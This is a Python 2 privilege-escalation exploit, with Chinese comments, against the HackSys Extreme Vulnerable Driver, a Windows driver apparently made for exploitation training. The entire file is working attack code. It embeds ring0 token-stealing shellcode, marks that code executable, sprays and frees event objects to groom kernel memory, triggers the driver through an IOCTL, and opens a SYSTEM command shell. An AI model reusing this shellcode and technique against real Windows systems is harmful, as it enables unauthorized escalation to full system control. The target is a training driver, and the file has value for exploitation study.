import ctypes, sys, struct
from ctypes import *
from subprocess import *
 
def main():
    spray_event = []
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not hevDevice or hevDevice == -1:
        print "*** Couldn't get Device Driver handle"
        sys.exit(-1)
 
    # 定义 ring0级的 shellcode， 使用 VirtualProtect() 函数 该表内存区域属性。c
    # 地址中不能包含Null 字符，否则exp 会失效。 
 
    shellcode = (
        "\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                      # jnz
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        "\x61"                          # popad
        "\xC3"                          # ret
    )
 
    shellcode_address = id(shellcode) + 20
    shellcode_address_struct = struct.pack("<L", shellcode_address)
    print "[+] Pointer for ring0 shellcode: {0}".format(hex(shellcode_address))
    success = kernel32.VirtualProtect(shellcode_address, c_int(len(shellcode)), c_int(0x40), byref(c_long()))
    if success == 0x0:
        print "\t[+] Failed to change memory protection."
        sys.exit(-1)
 
    #定义 lpName 的静态部分, 大小为 0xF0, 根据 shellcode 的 地址 和 动态部分作出调整。
 
    static_lpName = "\x41\x41\x41\x41" + shellcode_address_struct + "\x42" * (0xF0-4-4-4)
 
    # 分配 256 个 相同大小的 CreateEvent 对象
 
    print "\n[+] Spraying Event Objects..."
 
    for i in xrange(256):
        dynamic_lpName = str(i).zfill(4)
        spray_event.append(kernel32.CreateEventW(None, True, False, c_char_p(static_lpName+dynamic_lpName)))
        if not spray_event[i]:
            print "\t[+] Failed to allocate Event object."
            sys.exit(-1)
 
    # 释放 CreateEvent 对象
 
    print "\n[+] Freeing Event Objects..."
 
    for i in xrange(0, len(spray_event), 1):
        if not kernel32.CloseHandle(spray_event[i]):
            print "\t[+] Failed to close Event object."
            sys.exit(-1)
 
    buf = '\x37\x13\xd3\xba'
    bufLength = len(buf)
 
    kernel32.DeviceIoControl(hevDevice, 0x222033, buf, bufLength, None, 0, byref(c_ulong()), None)
 
    print "\n[+] nt authority\system shell incoming"
    Popen("start cmd", shell=True)
 
if __name__ == "__main__":
    main()